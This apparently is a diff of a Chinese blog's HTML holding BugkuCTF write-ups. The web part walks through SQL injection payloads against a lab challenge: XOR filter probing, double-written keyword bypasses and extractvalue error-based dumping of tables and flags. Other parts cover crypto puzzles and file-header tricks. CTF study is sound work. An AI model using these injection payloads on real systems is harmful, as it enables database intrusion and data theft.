+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;</span><br><span class="line">#报错</span><br><span class="line"></span><br><span class="line">?id=1&apos; #</span><br><span class="line">#报错</span><br><span class="line">?id=1&apos; %23</span><br><span class="line">#正常，过滤了#号，要用%23代替。--+没有被过滤</span><br><span class="line"></span><br><span class="line">?id=1&apos; or 1=1 %23</span><br><span class="line">#报错</span><br><span class="line">?id=1&apos; || 1=1 %23</span><br><span class="line">#正常，过滤了or</span><br></pre></td></tr></table></figure>
+<p>用正常语句来判断那个单词被过滤效率比较低，看了别人的Writeup，学习到了一种新方法</p>
+<p><code>异或注入</code>：两个条件相同（同真或同假）即为假</p>
+<p>如下面的语句，当<code>union</code>被过滤时，也就是<code>length(&#39;union&#39;)!=0</code>为假，<code>length(&#39;union&#39;)==0</code>为真，union<code>被过滤了</code>，下面的等式等于：<code>1^0=1</code>，页面应该正常返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;^(length(&apos;union&apos;)!=0)--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-1.png" alt="9-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-2.png" alt="9-2"></p>
+<p>按照这种方法，发现被过滤的一共有：<code>union、select、or、and</code></p>
+<p>然后发现<code>双写</code>可以直接绕过过滤</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-3.png" alt="9-3"></p>
+<p>爆表名：（此时要记得，<code>information</code>里面也有<code>or</code>，记得双写）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</span><br><span class="line">#flag1,hint</span><br></pre></td></tr></table></figure>
+<p>爆列名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag1&apos; --+</span><br><span class="line">#flag1,address</span><br></pre></td></tr></table></figure>
+<p>爆数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; uniunionon selselectect 1,group_concat(flag1) from flag1 --+</span><br><span class="line">#usOwycTju+FTUUzXosjr</span><br></pre></td></tr></table></figure>
+<p>对爆出来的字符串没什么想法，想起来题目提示本题有<code>两个flag</code></p>
+<p>爆另外一列的数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; uniunionon selselectect 1,group_concat(address) from flag1 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-4.png" alt="9-4"></p>
+<p>点击后进入下一关</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-5.png" alt="9-5"></p>
+<p>加上<code>单引号</code>时，弹出报错信息，可以判断是用单引号包裹的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-6.png" alt="9-6"></p>
+<p>同理，用前面学到的异或运算，判断页面有哪几种状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;^1 --+</span><br><span class="line"></span><br><span class="line">?id=1&apos;^0 --+</span><br></pre></td></tr></table></figure>
+<p>此时我们知道了，网页有两种状态：1.正确时返回<code>Hello,I Am Here!</code>，2.错误时返回<code>Nobody!</code></p>
+<p>想要开始测试被过滤的单词，后来我们发现，服务器给我们返回我们输入的<code>id</code>值，如果字符被过滤掉，就不会回显</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-7.png" alt="9-7"></p>
+<p>我们也可以直接利用这点直接判断那些被过滤：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-8.png" alt="9-8"></p>
+<p>从上图我们可以看出<code>union</code>、<code>sleep</code>被过滤了，并且此题无法用<code>大小写</code>、<code>双写</code>来绕过，但是<code>报错注入</code>没有被过滤</p>
+<p>爆表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span><br><span class="line">#class,flag2</span><br></pre></td></tr></table></figure>
+<p>爆列名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag2&apos;)))--+</span><br><span class="line">#flag2,address</span><br></pre></td></tr></table></figure>
+<p>爆数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e))--+</span><br><span class="line">#flag&#123;Bugku-sql_6s-2i-4t-bug&#125;，但这个不是flag，骗人</span><br><span class="line"></span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(address) from flag2),0x7e))--+</span><br><span class="line">./Have_Fun.php</span><br></pre></td></tr></table></figure>
+<p>和第一步一样，有一个地址，访问一下一片空白，用<code>Burpsuits</code>看一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-9.png" alt="9-9"></p>
+<p>添加<code>X-Forwarded-For</code>字段，发现返回图片</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-10.png" alt="9-10"></p>
+<p>用浏览器看一下发现是一张<code>二维码</code>，用手机扫描：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-11.png" alt="9-11"></p>
+<p>进入这个页面后，开始失去了方向，参数game传入也没有用，最后回到题目提示：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/31-40/9-12.png" alt="9-12"></p>
+<p><code>flag只有2个</code>，那我们爆出来的flag2就是答案才对</p>
+<p>再看第二句，<code>flag是小写</code>，把flag的B改成小写b：<code>flag{bugku-sql_6s-2i-4t-bug}</code></p>
+<p>提交一下，成功了。。。。。</p>
+<p>所以第三步是骗人的，要回到题目提示，不然会被自己带进去绕不出来</p>
+<hr>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/04/10/BugKuCTF—Web题 第31-40关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-BugKuCTF—加密题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">BugKuCTF — 加密题(第1-10关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/" class="archive-article-date">
   	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
 </a>
         
@@ -154,36 +369,35 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF E0</span><br><span class="line"></span><br><span class="line">PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82</span><br><span class="line"></span><br><span class="line">7z：37 7A BC AF 27 1C</span><br><span class="line"></span><br><span class="line">GIF (gif)：47 49 46 38 39 61</span><br><span class="line"></span><br><span class="line">ZIP Archive (zip)：50 4B 03 04</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)：52 61 72 21</span><br><span class="line"></span><br><span class="line">Wave (wav)：57 41 56 45</span><br><span class="line"></span><br><span class="line">AVI (avi)：41 56 49 20</span><br><span class="line"></span><br><span class="line">Real Audio (ram)：2E 72 61 FD</span><br><span class="line"></span><br><span class="line">Real Media (rm)：2E 52 4D 46</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 BA</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 B3</span><br></pre></td></tr></table></figure>
+        <h3 id="第一关（滴答-滴）"><a href="#第一关（滴答-滴）" class="headerlink" title="第一关（滴答~滴）"></a>第一关（滴答~滴）</h3><p>百度一下题目给的数字，发现是摩斯密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-1.png" alt="1-1"></p>
+<p>在线解密一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-2.png" alt="1-2"></p>
+<p>提交就对了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-3.png" alt="1-3"></p>
 <hr>
-<h3 id="修改图片的高度和宽度"><a href="#修改图片的高度和宽度" class="headerlink" title="修改图片的高度和宽度"></a>修改图片的高度和宽度</h3><h4 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h4><p>涉及题目：杂项题第三题</p>
-<p>图片格式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，</span><br><span class="line"></span><br><span class="line">（可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line"></span><br><span class="line">（可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到</span><br></pre></td></tr></table></figure>
-<p>所以，撇掉前16个字节（第一行）后，修改第17-20字节为修改高度，修改第21-24字节为修改宽度</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-3.png" alt></p>
-<h4 id="JPEG图片"><a href="#JPEG图片" class="headerlink" title="JPEG图片"></a>JPEG图片</h4><p>涉及题目：杂项题第二十九题</p>
-<p>图片格式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FFD8：图片起始标示位</span><br><span class="line">FFC0：SOFO，Start of Frame，帧图像开始，修改高度宽度应注意的标示位</span><br><span class="line">FFD9：图片结束标识位</span><br></pre></td></tr></table></figure>
-<p>JPEG（JPG）图片的高度和宽度的位置不像PNG图片那样是固定的</p>
-<p>而是根据图片的不同而不同位置，但是却也有规律可以找</p>
-<p>修改JPG图片的高度和宽度要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度。但要注意的是也有图片需要找0xFFC2，就像第二十九题</p>
-<p>所以使用winhex的情况下，搜索Hex值（Ctrl+Alt+X）：FFC0或FFC2，一般位置比较靠前</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-7.png" alt></p>
-<p>标示位往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度</p>
-<p>如下图：66是高度，781是宽度，和图片属性里面的一样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-8.png" alt></p>
+<h3 id="第二关（聪明的小羊）"><a href="#第二关（聪明的小羊）" class="headerlink" title="第二关（聪明的小羊）"></a>第二关（聪明的小羊）</h3><p>题目提示很明显了：栅栏密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-1.png" alt="2-1"></p>
+<p>用Python写个脚本</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-2.png" alt="2-2"></p>
+<p>跑一下flag直接出来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-3.png" alt="2-3"></p>
+<p>也可以使用网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码在线加密解密</a></p>
 <hr>
-<h3 id="压缩文件伪加密"><a href="#压缩文件伪加密" class="headerlink" title="压缩文件伪加密"></a>压缩文件伪加密</h3><h4 id="ZIP文件"><a href="#ZIP文件" class="headerlink" title="ZIP文件"></a>ZIP文件</h4><p>讲到伪加密，需要对ZIP文件的格式加上一些的补充：</p>
-<p>一格zip文件有三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.压缩源文件数据区：</span><br><span class="line">开头也就是前面内容提到，ZIP文件开头标识：</span><br><span class="line">50 4B 03 04</span><br><span class="line"></span><br><span class="line">2.压缩源文件目录区：</span><br><span class="line">50 4B 01 02：目录中文件文件头标记</span><br><span class="line">3F 00：压缩使用的 pkware 版本 </span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class="line"></span><br><span class="line">3.压缩源文件目录结束标志 ：</span><br><span class="line">50 4B 05 06</span><br></pre></td></tr></table></figure>
-<p>简单创建一个flag.txt，压缩成ZIP格式并且不设密码，用winhex打开，全局方式位标识确实是00 00</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-1.png" alt="11-1"></p>
-<p>修改后，再次想要解压时，就提示需要输入密码了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-2.png" alt="11-2"></p>
-<h4 id="RAR文件"><a href="#RAR文件" class="headerlink" title="RAR文件"></a>RAR文件</h4><p>涉及题目：分析题第五题</p>
-<p>RAR文件的伪加密比较少见，没有深入调查，只根据题目做简单的介绍</p>
-<p>方法：将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密）</p>
+<h3 id="第三关（ok）"><a href="#第三关（ok）" class="headerlink" title="第三关（ok）"></a>第三关（ok）</h3><p>好多的ok，那么这个就是<strong>Ook!编码</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-1.png" alt="3-1"></p>
+<p>找个在线解码网站：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck/Ook在线加密解密</a></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-2.png" alt="3-2"></p>
+<p>flag直接解出来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/3-3.png" alt="3-3"></p>
 <hr>
+<h3 id="第四关（这不是摩斯密码）"><a href="#第四关（这不是摩斯密码）" class="headerlink" title="第四关（这不是摩斯密码）"></a>第四关（这不是摩斯密码）</h3><p>打开看一下，发现是<strong>Brainfuck编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;</span><br><span class="line">]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----</span><br><span class="line">-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-1.png" alt="4-1"></p>
+<p>那就能继续利用上面哪个网站破解</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-2.png" alt="4-2"></p>
+<p>成功解出flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/4-3.png" alt="4-3"></p>
 
       
 
@@ -207,7 +421,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">展开全文 >></a>
         </p>
       
 
@@ -460,19 +674,19 @@
 
 
   
-    <article id="post-BugKuCTF—加密题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-BugKuCTF—杂项题中常见的文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">BugKuCTF — 加密题(第1-10关)</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/" class="archive-article-date">
+        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/" class="archive-article-date">
   	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
 </a>
         
@@ -480,35 +694,36 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="第一关（滴答-滴）"><a href="#第一关（滴答-滴）" class="headerlink" title="第一关（滴答~滴）"></a>第一关（滴答~滴）</h3><p>百度一下题目给的数字，发现是摩斯密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-1.png" alt="1-1"></p>
-<p>在线解密一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-2.png" alt="1-2"></p>
-<p>提交就对了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/1-3.png" alt="1-3"></p>
+        <h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF E0</span><br><span class="line"></span><br><span class="line">PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82</span><br><span class="line"></span><br><span class="line">7z：37 7A BC AF 27 1C</span><br><span class="line"></span><br><span class="line">GIF (gif)：47 49 46 38 39 61</span><br><span class="line"></span><br><span class="line">ZIP Archive (zip)：50 4B 03 04</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)：52 61 72 21</span><br><span class="line"></span><br><span class="line">Wave (wav)：57 41 56 45</span><br><span class="line"></span><br><span class="line">AVI (avi)：41 56 49 20</span><br><span class="line"></span><br><span class="line">Real Audio (ram)：2E 72 61 FD</span><br><span class="line"></span><br><span class="line">Real Media (rm)：2E 52 4D 46</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 BA</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 B3</span><br></pre></td></tr></table></figure>
 <hr>
-<h3 id="第二关（聪明的小羊）"><a href="#第二关（聪明的小羊）" class="headerlink" title="第二关（聪明的小羊）"></a>第二关（聪明的小羊）</h3><p>题目提示很明显了：栅栏密码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-1.png" alt="2-1"></p>
-<p>用Python写个脚本</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-2.png" alt="2-2"></p>
-<p>跑一下flag直接出来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E5%8A%A0%E5%AF%86/1-10/2-3.png" alt="2-3"></p>
-<p>也可以使用网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码在线加密解密</a></p>
+<h3 id="修改图片的高度和宽度"><a href="#修改图片的高度和宽度" class="headerlink" title="修改图片的高度和宽度"></a>修改图片的高度和宽度</h3><h4 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h4><p>涉及题目：杂项题第三题</p>
+<p>图片格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，</span><br><span class="line"></span><br><span class="line">（可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line"></span><br><span class="line">（可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到</span><br></pre></td></tr></table></figure>
+<p>所以，撇掉前16个字节（第一行）后，修改第17-20字节为修改高度，修改第21-24字节为修改宽度</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-3.png" alt></p>
+<h4 id="JPEG图片"><a href="#JPEG图片" class="headerlink" title="JPEG图片"></a>JPEG图片</h4><p>涉及题目：杂项题第二十九题</p>
+<p>图片格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FFD8：图片起始标示位</span><br><span class="line">FFC0：SOFO，Start of Frame，帧图像开始，修改高度宽度应注意的标示位</span><br><span class="line">FFD9：图片结束标识位</span><br></pre></td></tr></table></figure>
+<p>JPEG（JPG）图片的高度和宽度的位置不像PNG图片那样是固定的</p>
+<p>而是根据图片的不同而不同位置，但是却也有规律可以找</p>
+<p>修改JPG图片的高度和宽度要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度。但要注意的是也有图片需要找0xFFC2，就像第二十九题</p>
+<p>所以使用winhex的情况下，搜索Hex值（Ctrl+Alt+X）：FFC0或FFC2，一般位置比较靠前</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-7.png" alt></p>
+<p>标示位往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度</p>
+<p>如下图：66是高度，781是宽度，和图片属性里面的一样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-8.png" alt></p>
 <hr>
-<h3 id="第三关（ok）"><a href="#第三关（ok）" class="headerlink" title="第三关（ok）"></a>第三关（ok）</h3><p>好多的ok，那么这个就是<strong>Ook!编码</strong></p>
